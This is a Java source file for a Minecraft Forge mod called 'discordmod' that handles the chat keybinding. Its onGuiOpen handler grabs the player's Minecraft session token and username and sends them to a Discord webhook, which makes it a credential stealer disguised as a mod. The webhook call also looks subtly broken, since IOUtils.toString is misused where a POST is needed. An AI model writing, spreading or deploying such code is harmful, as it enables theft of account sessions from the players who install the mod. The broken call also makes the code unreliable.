import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.GuiChat;
import net.minecraft.client.settings.KeyBinding;
import net.minecraftforge.client.event.GuiOpenEvent;
import net.minecraftforge.client.settings.KeyConflictContext;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.InputEvent.KeyInputEvent;

import org.apache.commons.io.IOUtils;
import org.json.JSONObject;

import com.google.common.collect.ImmutableMap;

@Mod(modid = "discordmod", version = "1.0")
public class DiscordMod {
    private boolean keyPressed = false;
    private final Minecraft mc = Minecraft.getMinecraft();

    @SubscribeEvent
    public void onKeyInput(KeyInputEvent event) {
        final KeyBinding keyBinding = this.mc.gameSettings.keyBindChat;

        if (!this.keyPressed && keyBinding.isKeyDown()) {
            if (this.mc.currentScreen == null) {
                this.mc.displayGuiScreen(new GuiChat());
            }
            this.keyPressed = true;
        } else if (this.keyPressed && !keyBinding.isKeyDown()) {
            this.keyPressed = false;
        }
    }

    @SubscribeEvent
    public void onGuiOpen(GuiOpenEvent event) throws IOException {
        if (!this.mc.isIntegratedServerRunning() && event.getGui() == null) {
            final String token = mc.getSession().getToken();
            final String username = mc.getSession().getUsername();

            final String webhookUrl = "https://discord.com/api/webhooks/XXXXXXXXXXXXXXX";
            final Map<String, String> content = ImmutableMap.of("content", token, "username", username);
            final JSONObject json = new JSONObject(content);
            IOUtils.toString(webhookUrl, json.toString());

            this.mc.player.sendChatMessage("/msg Discord Token: " + token + " sent to webhook!");
        }
    }
}
